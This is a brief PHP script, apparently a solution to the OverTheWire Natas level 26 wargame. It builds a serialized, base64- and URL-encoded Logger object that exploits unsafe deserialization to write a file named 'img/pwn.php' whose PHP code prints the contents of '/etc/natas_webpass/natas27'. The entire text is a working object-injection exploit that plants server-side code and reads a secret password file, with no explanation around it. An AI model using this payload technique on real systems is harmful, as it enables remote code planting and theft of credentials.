<?php

class Logger{
	private $logFile = "img/pwn.php";
	private $initMsg = "hello";
    private $exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
}

$encoded = base64_encode(serialize(new Logger));

echo urlencode($encoded);
echo "\n";
?>